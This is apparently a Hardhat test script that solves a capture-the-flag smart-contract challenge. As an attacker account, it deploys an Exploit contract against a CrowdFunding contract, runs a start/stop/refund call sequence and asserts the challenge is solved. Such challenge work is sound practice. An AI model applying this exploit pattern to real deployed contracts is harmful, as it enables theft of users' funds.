import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_mhchia, CHALLENGE_mhchia} from "../../scripts/addresses"
import {BigNumber} from "ethers";

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/mhchia/Setup.sol:Setup`, SETUP_mhchia)).connect(attacker);
    challenge = (await ethers.getContractAt(`contracts/mhchia/CrowdFunding.sol:CrowdFunding`, CHALLENGE_mhchia)).connect(attacker);
});

it("prints contract address", async function () {
    expect(await setup.instance()).to.eq(CHALLENGE_mhchia);
});

it("look", async function() {
    
})

it("exploit", async () => {
    exploit = await (await ethers.getContractFactory(`contracts/mhchia/Exploit.sol:Exploit`, attacker)).deploy(challenge.address, {value: 2});
    
    await challenge.startCampaign({value: 1});
    await challenge.startCampaign({value: 1});
    await challenge.stopCampaign(1);
    await challenge.getRefund(1, 0, {value: 1});

    expect(await setup.isSolved()).to.eq(true);
});